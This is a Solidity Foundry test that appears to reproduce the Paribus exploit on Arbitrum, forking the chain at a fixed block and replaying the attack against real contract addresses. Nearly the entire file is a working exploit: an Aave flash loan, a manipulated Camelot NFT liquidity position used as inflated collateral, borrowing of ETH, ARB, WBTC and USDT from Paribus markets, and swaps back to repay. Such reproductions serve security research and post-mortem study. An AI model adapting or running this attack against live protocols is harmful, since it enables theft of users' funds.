// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../basetest.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~86k
// Attacker : https://arbiscan.io/address/0x56190CAC88b8D4b5D5Ed668ef81828913932e7Ed
// Attack Contract : https://arbiscan.io/tx/0x43aa42d2f11afe42832a9619bc8066dfb83a921798b91eaf9d0345dd27dcfb06
// Vulnerable Contract : https://arbiscan.io/address/0xaffd437801434643b734d0b2853654876f66f7d7
// Attack Tx : https://arbiscan.io/tx/0xf5e753d3da60db214f2261343c1e1bc46e674d2fa4b7a953eaf3c52123aeebd2

// @Info
// Vulnerable Contract Code : https://arbiscan.io/address/0xaffd437801434643b734d0b2853654876f66f7d7#code

// @Analysis
// Post-mortem : https://bitfinding.com/blog/paribus-hack-interception
// Twitter Guy : https://x.com/BitFinding/status/1882880682512527516
// Hacking God : 

interface NFTPositionManager {
    function mint(uint256) external;

    function mint(
        MintParams calldata params
    ) external payable returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);

    function approve(address to, uint256 tokenId) external;

    struct MintParams {
        address token0;
        address token1;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }
}

interface CamelotRouter {
    function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);

    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 limitSqrtPrice;
    }
}

interface ControllerNFT {
    function enterNFTMarkets(address[] calldata pNFTTokens) external;
}

interface PBXToken is IERC20 {
    function mint(uint256 tokenId) external;
    function borrow(uint256) external returns (uint256);
}

contract ParibusExploit is BaseTestWithBalanceLog {
    IAaveFlashloan private constant Aave = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    CamelotRouter CamelotRouterV3 = CamelotRouter(0x1F721E2E82F6676FCE4eA07A5958cF098D339e18);
    Uni_Router_V3 UniswapRouterV3 = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    NFTPositionManager CamelotNFTPositionManager = NFTPositionManager(0x00c7f3082833e796A5b3e4Bd59f6642FF44DCD15);
    ControllerNFT ComptrollerNFT = ControllerNFT(0x712E2B12D75fe092838A3D2ad14B6fF73d3fdbc9);
    NFTPositionManager PNFTTokenDelegator = NFTPositionManager(0xa26B6Df27F520017a2F0A5b0C0aA9C97D05f1f26);
    IERC20 WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    //ETH is created as address(0) in the setUp()
    IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
    IERC20 PBX = IERC20(0xbAD58ed9b5f26A002ea250D7A60dC6729a4a2403);
    IERC20 ARB_DAO = IERC20(0x912CE59144191C1204E64559FE8253a0e49E6548);
    //PBX Tokens:
    PBXToken pETH = PBXToken(0xAffd437801434643B734D0B2853654876F66f7D7);
    PBXToken pARB = PBXToken(0xFc2737a742A741d13fE6326011a78cd881dE3Eb9);
    PBXToken pWBTC = PBXToken(0x1c762E00f1D9317a4214d22b2576995C427F61c9);
    PBXToken pUSDT = PBXToken(0xFB1dcFc67cC496Eb0cC592050AF7Fdf3bF3b5C13);

    uint256 private constant blocknumToForkFrom = 296_699_666;

    function setUp() public {
        vm.createSelectFork("arbitrum", blocknumToForkFrom);
        vm.label(address(0), "ETH");
        vm.label(address(USDT), "USDT");
        vm.label(address(PBX), "PBX");
        vm.label(address(ARB_DAO), "ARB_DAO");
    }

    function testExploit() public {
        emit log_named_decimal_uint("Exploiter ETH balance before attack", address(this).balance, 18);
        emit log_named_decimal_uint("Exploiter USDT balance before attack", USDT.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("Exploiter ARB_DAO balance before attack", ARB_DAO.balanceOf(address(this)), 18);

        Aave.flashLoanSimple(address(this), address(USDT), 3093209807085, bytes(""), 0);

        emit log_named_decimal_uint("Exploiter ETH balance after attack", address(this).balance, 18);
        emit log_named_decimal_uint("Exploiter USDT balance after attack", USDT.balanceOf(address(this)), 6);
        emit log_named_decimal_uint("Exploiter ARB_DAO balance after attack", ARB_DAO.balanceOf(address(this)), 18);
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        WETH.approve(address(CamelotRouterV3), type(uint256).max);
        WBTC.approve(address(CamelotRouterV3), type(uint256).max);
        USDT.approve(address(CamelotRouterV3), type(uint256).max);
        PBX.approve(address(CamelotRouterV3), type(uint256).max);
        WBTC.approve(address(UniswapRouterV3), type(uint256).max);
        USDT.approve(address(CamelotNFTPositionManager), type(uint256).max);
        PBX.approve(address(CamelotNFTPositionManager), type(uint256).max);

        CamelotRouter.ExactInputSingleParams memory CamelotStructure = CamelotRouter.ExactInputSingleParams(
            address(USDT),
            address(PBX),
            address(this),
            1737200705,
            1000000000000,
            0,
            0
        );
        CamelotRouterV3.exactInputSingle(CamelotStructure);

        NFTPositionManager.MintParams memory Structure = NFTPositionManager.MintParams(
            address(PBX),
            address(USDT),
            -870000,
            870000,
            789722754473453300405586192,
            500000000000,
            0,
            0,
            address(this),
            1737200720
        );
        CamelotNFTPositionManager.mint(Structure);
        CamelotNFTPositionManager.approve(address(PNFTTokenDelegator), 224023);

        address[] memory markets = new address[](1);
        markets[0] = address(PNFTTokenDelegator);
        ComptrollerNFT.enterNFTMarkets(markets);
        PNFTTokenDelegator.mint(224023);
        pETH.borrow(12599960598441767978);
        //ask for pARB balance
        pARB.borrow(6510273280264926258675);
        //ask for pWBTC balance
        pWBTC.borrow(36729789);
        //ask for pUSDT balance
        pUSDT.borrow(3924210566);

        CamelotRouter.ExactInputSingleParams memory CamelotStructure2 = CamelotRouter.ExactInputSingleParams(
            address(PBX),
            address(USDT),
            address(this),
            1737200705,
            31033846713245530612217763,
            0,
            0
        );
        CamelotRouterV3.exactInputSingle(CamelotStructure2);

        Uni_Router_V3.ExactInputSingleParams memory paramsUniswap = Uni_Router_V3.ExactInputSingleParams(
            address(WBTC),
            address(USDT),
            500,
            address(this),
            1737200705,
            36729789,
            0,
            0
        );
        UniswapRouterV3.exactInputSingle(paramsUniswap);

        USDT.approve(address(Aave), type(uint256).max);
        return true;
    }
}
